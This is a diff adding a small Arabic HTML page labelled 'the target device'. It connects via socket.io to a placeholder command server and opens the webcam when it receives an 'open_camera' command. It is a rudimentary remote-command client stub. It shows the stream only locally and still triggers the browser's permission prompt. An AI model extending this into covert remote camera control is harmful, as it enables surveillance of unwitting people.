@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الجهاز الهدف</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+</head>
+<body>
+    <h2>هذا الجهاز في انتظار الأوامر...</h2>
+    <video id="videoElement" autoplay playsinline style="width: 100%; max-width: 400px; display: none; border: 2px solid red;"></video>
+
+    <script>
+        // الاتصال بالسيرفر (اكتب رابط السيرفر هنا بعد رفعه)
+        const socket = io("http://localhost:3000"); 
+
+        socket.on('execute_command', (command) => {
+            if (command === 'open_camera') {
+                // محاولة فتح الكاميرا
+                navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    let video = document.getElementById('videoElement');
+                    video.style.display = 'block';
+                    video.srcObject = stream;
+                })
+                .catch(function (error) {
+                    console.log("حدث خطأ أو تم رفض الصلاحية:", error);
+                    alert("لم يتم السماح بفتح الكاميرا!");
+                });
+            }
+        });
+    </script>
+</body>
+</html>
